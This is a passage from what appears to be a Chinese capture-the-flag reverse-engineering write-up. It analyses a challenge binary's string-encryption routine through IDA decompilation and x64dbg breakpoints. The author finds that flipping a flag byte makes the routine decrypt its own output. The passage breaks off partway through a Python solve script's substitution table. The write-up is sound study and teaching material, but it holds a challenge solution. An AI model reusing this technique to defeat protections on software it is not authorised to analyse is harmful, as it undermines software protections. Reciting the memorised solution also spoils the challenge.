    v4 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16</span>i64 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v56 <span class="token operator">>></span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1FF</span><span class="token punctuation">)</span> <span class="token operator">+</span> v55<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>显然这个 v4 就是 Tvalue *rc；在 x64_dbg 中跟踪这个东西。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/TValue.jpg" alt="TValue"></p>
<p>在此处 GETTABLE 下一个断在 OP_CALL 使得这个真正加载完。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/out_TValue.jpg" alt="out_TValue"></p>
<p>在标蓝色的地方下一个 1byte 硬件写入断点，运行。（我这里写了加硬件写入断点，但是刚才调试的时候忘记加了。。又得重来一遍）</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/hardware_breakpoint.jpg" alt="hardware_breakpoint"></p>
<p>走出这个 dll 代码，肯定是哪里调用了什么修改这个字符串的函数。</p>
<p>发现这个函数在</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/out_step.jpg" alt="out_step"></p>
<p>回到 ida 找这个代码所在。</p>
<p>会发现这个两个代码，看来是加密函数无疑了。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">may_change_string</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>
  <span class="token class-name">size_t</span> Size<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp+8h] BYREF</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>Src<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp+28h]</span>
  _OWORD v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp+48h] BYREF</span>
  _OWORD v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+A8h] [rbp+78h] BYREF</span>
  <span class="token keyword">int</span> part_of_my_string<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+E0h] [rbp+B0h] BYREF</span>
  <span class="token keyword">char</span> used_to_output<span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+150h] [rbp+120h] BYREF</span>
  <span class="token keyword">char</span> v11<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1C0h] [rbp+190h] BYREF</span>
  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+244h] [rbp+214h]</span>
  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+264h] [rbp+234h]</span>

  v1 <span class="token operator">=</span> v4<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">258</span>i64<span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>
    v1 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">sub_7FF6A2941A7D</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_7FF6A29C40B3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  Src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_7FF6A29410A0</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">1</span>i64<span class="token punctuation">,</span> Size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  Size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span>i64<span class="token punctuation">;</span>
  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> xmmword_7FF6A29B3238<span class="token punctuation">;</span>
  v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> xmmword_7FF6A29B3250<span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>part_of_my_string<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x47u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_memcpy</span><span class="token punctuation">(</span>part_of_my_string<span class="token punctuation">,</span> Src<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>part_of_my_string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>used_to_output<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x50u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v12 <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
  v13 <span class="token operator">=</span> <span class="token function">must_enc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v7<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v8<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>part_of_my_string<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> used_to_output<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_memcpy</span><span class="token punctuation">(</span>Src<span class="token punctuation">,</span> used_to_output<span class="token punctuation">,</span> <span class="token number">0x50u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_7FF6A29418FC</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v4<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_7FF6A29B30F0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_7FF6A2947F04</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>part_of_my_string<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span> a4_64u<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>out_put_string<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// edi</span>
  <span class="token keyword">char</span> v9<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>
  <span class="token keyword">char</span> v10<span class="token punctuation">[</span><span class="token number">216</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp+10h] BYREF</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+118h] [rbp+E8h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>Block<span class="token punctuation">;</span> <span class="token comment">// [rsp+138h] [rbp+108h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+158h] [rbp+128h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+178h] [rbp+148h]</span>
  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// [rsp+194h] [rbp+164h]</span>
  <span class="token keyword">int</span> v16<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1B4h] [rbp+184h] BYREF</span>
  <span class="token keyword">int</span> v17<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1D4h] [rbp+1A4h] BYREF</span>
  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// [rsp+214h] [rbp+1E4h]</span>

  v5 <span class="token operator">=</span> v9<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">190</span>i64<span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>
    v5 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">sub_7FF6A2941A7D</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_7FF6A29C4006<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v17<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v18 <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">-</span> a4_64u <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">;</span>
  v13 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v18 <span class="token operator">+</span> a4_64u<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// v13 = malloc(80)</span>
  <span class="token function">j_memcpy</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> part_of_my_string<span class="token punctuation">,</span> a4_64u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_7FF6A2941A28</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v10<span class="token punctuation">,</span> <span class="token number">1</span>i64<span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// creat v10 byte stream</span>
  v15 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a4_64u <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>                  <span class="token comment">// v15 = 20u</span>
  v11 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span>i64 <span class="token operator">*</span> v15<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// v11 = malloc(80)</span>
  Block <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">memcpy_version2</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>a4_64u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// create Block by v13</span>
  <span class="token function">j_enc1</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v10<span class="token punctuation">,</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>Block<span class="token punctuation">,</span> a4_64u<span class="token punctuation">,</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v11<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v16<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// enc1</span>
  <span class="token function">j_enc2</span><span class="token punctuation">(</span>v10<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v11 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v17<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// enc2</span>
  v14 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_7FF6A29412A3</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v17<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// make v14 by v11</span>
  <span class="token function">j_memcpy</span><span class="token punctuation">(</span>out_put_string<span class="token punctuation">,</span> v14<span class="token punctuation">,</span> v17<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>Block<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>v14<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> v17<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">sub_7FF6A29418FC</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v9<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_7FF6A29A6FE0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v7<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>上面的注释就是对这个 enc 的分析了。</p>
<p>他会创建一块 block 保存输入进的字符串，这个单看这个有点奇怪的代码其实不适合，动态调试比较方便，这也是为什么我上面的几个 x64_dbg 调试下面内存窗口名字都是这些变量的名字。</p>
<p>而且还自己实现了两个 memcpy 函数，我一开始差点看懵了。</p>
<p>可以看出前面几个函数基本都在初始化参数，在下面 enc1 和 enc2进行加密。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/enc.jpg" alt="enc"></p>
<p>在 enc1 中我们可以发现<strong>红色框框</strong>进行了一个判断，很奇怪，我一开始没注意，直到我跟进<strong>黄色框框</strong>才发现这个函数有多复杂，搜索后发现有一些操作和 AES 很像，但是很奇怪，AES 的 s-box，轮数，其实都对不上。我看这个 if else 好像有点互逆的样子，我试着把 block 中的字符串改成了输出，修改了这个标志位，再调用加密，结果很惊人。它恢复了 ‘a’*64 字符串。上点图。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/aaa_before_enc.jpg" alt="aaa_before_enc"></p>
<p>可见 v10 有一个标志位，然后加密 block 字符串。<br>经过两个加密程序后。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/aaa_after_enc.jpg" alt="aaa_after_enc"></p>
<p>把这一段 dump 下来当作 block 输入，再把 标志位改成 0（有时候就要试探一下）</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/reaaa_before.jpg" alt="aaa_before_enc"></p>
<p>经过加密</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/reaaa_after.jpg" alt="aaa_after_enc"></p>
<p>他居然变成了 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa…. 哈哈哈哈哈，那一切迎刃而解。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#exp.py</span>
tables <span class="token operator">=</span> <span class="token punctuation">[</span>
<span class="token punctuation">[</span><span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">246</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">184</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token 